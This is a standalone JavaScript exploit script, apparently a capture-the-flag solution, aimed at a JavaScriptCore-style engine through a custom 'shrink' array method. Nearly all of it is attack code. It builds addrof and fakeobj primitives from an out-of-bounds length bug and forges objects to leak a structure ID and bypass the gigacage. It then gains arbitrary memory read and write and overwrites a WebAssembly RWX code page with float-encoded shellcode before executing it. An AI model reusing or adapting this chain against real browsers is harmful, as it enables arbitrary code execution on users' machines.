/**
 * Utils
 */
var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)
var BASE32 = 0x100000000

function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0) return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

/**
 * Exploit
 */
function pwn() {
    /* prepare rwx region */
    var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    let module = new WebAssembly.Module(buffer);
    var instance = new WebAssembly.Instance(module);
    var main = instance.exports.main;
    /* stage1 primitives :) */
    var stage1 = {
        addrof: function (obj) {
            var a = [1.1, 2.2, 3.3];
            var b = [1.1, obj]
            a.x = 3.14;
            b.x = 3.14;
            a.shrink(-0xfffffff0);
            ret = a[9];
            delete a
            delete b
            return ret;
        },
        fakeobj: function (addr) {
            var a = [1.1, 2.2, 3.3]; // ArrayWithDouble
            var b = [1.1, {}];
            a.x = 3.14;
            b.x = 3.14;
            a.shrink(-0xfffffff0);
            a[9] = addr;
            ret = b[1];
            delete a
            delete b
            return ret;
        }
    };
    /* evil object for gigacage bypass */
    var evil = [1.1, 2.2, 3.3, 4.4];
    evil.p0 = 3.14; // i forgot this and wasted 30min... no more CopyOnWrite
    /* Leak structureID */
    //*
    {
        i32[0] = 2;
        i32[1] = 0; // length (eventually become 0x20000 because it's boxed)
        var fakeModeLen = f64[0];
        var fakeStringObject = {
            modeLen: fakeModeLen,
            butterfly: evil
        }
        var addr_fakestr = i2f(f2i(stage1.addrof(fakeStringObject)) + 0x10);
        var fakeStr = stage1.fakeobj(addr_fakestr);
        i32[0] = 0xdead; // whatever sid
        i32[1] = 0x01180100 - 0x20000; // type: string
        var fakeJSCell = f64[0];
        var fakeJSObject = {
            JSCell: fakeJSCell,
            butterfly: fakeStr
        }
        var addr_fake = i2f(f2i(stage1.addrof(fakeJSObject)) + 0x10);
        var fakeObj = stage1.fakeobj(addr_fake);
        x = fakeObj.toString();
        if (x.charCodeAt(0) < 0x80 && x.charCodeAt(1) < 0x80) {
            // wide char
            var sid = x.charCodeAt(0) | (x.charCodeAt(1) << 8);
            var meta = x.charCodeAt(4) | (x.charCodeAt(5) << 8)
                | (x.charCodeAt(6) << 16) | (x.charCodeAt(7) << 24);
            i32[0] = x.charCodeAt(8) | (x.charCodeAt(9) << 8)
                | (x.charCodeAt(10) << 16) | (x.charCodeAt(11) << 24);
            i32[1] = x.charCodeAt(12) | (x.charCodeAt(13) << 8)
                | (x.charCodeAt(14) << 16) | (x.charCodeAt(15) << 24);
            var butterfly = f64[0];
        } else {
            // ascii char
            var sid = x.charCodeAt(0) | (x.charCodeAt(1) << 8);
            var meta = x.charCodeAt(2) | (x.charCodeAt(3) << 16);
            i32[0] = x.charCodeAt(4) | (x.charCodeAt(5) << 16);
            i32[1] = x.charCodeAt(6) | (x.charCodeAt(7) << 16);
            var butterfly = f64[0];
        }
        print("[+] sid = " + hex(sid));
        print("[+] meta = " + hex(meta));
        print("[+] butterfly = " + hex(f2i(butterfly)))
    }
    //*/

    /* victim object for gigacage bypass */
    var victim = stage1.fakeobj(butterfly);
    i32[0] = sid;
    i32[1] = meta;
    evil[0] = f64[0];
    /* stage2 primitives */
    var stage2 = {
        aar64: function (addr) {
            evil[1] = addr;
            return victim[0];
        },
        aaw64: function (addr, val) {
            evil[1] = addr;
            victim[0] = val;
        }
    }
    /* leak rwx pointer */
    var addr_main = f2i(stage1.addrof(main));
    print("[+] addr_main = " + hex(addr_main));
    var addr_code = f2i(stage2.aar64(i2f(addr_main + 0x28)));
    print("[+] addr_code = " + hex(addr_code));
    /* pwn */
    var shellcode = [
        3.881017456213327e-308, 1.3226630881879291e+213,
        4.349693030470885e+199, 1.6532613234162982e+184,
        5.43231273974412e-309, 1.238567325343229e-308,
        6.867659397698158e+246, -3.985959746423108e-73,
        -7.161105510817759e-74, 1.638223e-318
    ];
    for (var i = 0; i < shellcode.length; i++) {
        stage2.aaw64(i2f(addr_code + i * 8), shellcode[i]);
    }
    main();
}

pwn();
